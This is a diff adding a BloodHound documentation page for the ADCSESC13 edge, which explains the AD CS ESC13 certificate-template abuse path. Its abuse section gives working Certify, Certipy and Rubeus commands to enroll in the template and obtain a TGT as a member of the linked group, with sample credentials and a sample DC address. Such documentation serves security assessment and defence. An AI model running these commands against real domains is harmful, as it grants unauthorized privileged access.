@@ -1,0 +1,70 @@
+---
+title: ADCSESC13
+description: "The ADCSESC13 edge indicates that the principal has the privileges to perform the ADCS ESC13 abuse against the target AD group. The principal has enrollment rights on a certificate template configured with an issuance policy extension."
+---
+
+<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+
+
+ The issuance policy has an OID group link to an AD group. The principal also has enrollment permission for an enterprise CA with the necessary template published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup allows the principal to enroll a certificate that the principal can use to obtain access to the environment as a member of the group specified in the OID group link.
+
+## Abuse Info
+
+An attacker may perform this attack in the following steps:
+
+### Step 1: Request enrollment in the affected template
+
+On Windows, use Certify (2.0) to request enrollment in the affected template, specifying the affected certification authority:
+
+```cmd
+Certify.exe request --ca rootdomaindc.forestroot.com\forestroot-RootDomainDC-CA --template ESC13
+```
+
+On Linux, use Certipy to request enrollment in the affected template, specifying the affected enterprise CA:
+
+```bash
+certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13
+
+```
+
+If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.
+
+The certificate PFX is printed to the console in a base64-encoded format.
+
+### Step 2: Request a ticket granting ticket (TGT)
+
+On Windows, use Rubeus to request a TGT from the domain, specifying the attacker identity and the base64-encoded certificate from Step 1:
+
+```cmd
+Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:<cert base64> /ptt
+```
+
+On Linux, use Certipy to request a TGT from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:
+
+```bash
+certipy auth -pfx john.pfx -dc-ip 172.16.126.128
+```
+
+## Opsec Considerations
+
+When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate.
+
+## Edge Schema
+
+Source: [User](/resources/nodes/user), [Group](/resources/nodes/group), [Computer](/resources/nodes/computer)  
+Destination: [Group](/resources/nodes/group)  
+Traversable: **Yes**  
+
+## References
+
+This edge is related to the following MITRE ATT&CK technique:
+
+* [Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
+
+### Abuse info references
+
+* [ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
+* [Authentication Mechanism Assurance for AD DS in Windows Server 2008 R2 Step-by-Step Guide](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd378897(v=ws.10)?redirectedfrom=MSDN)
+* [Use Authentication Mechanism Assurance (AMA) to secure administrative account logins](https://www.gradenegger.eu/en/using-authentication-mechanism-assurance-ama-to-secure-the-login-of-administrative-accounts/)
+* [Certified Pre-Owned - Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [BOFHound: AD CS Integration](https://specterops.io/blog/2024/10/30/bofhound-ad-cs-integration/)
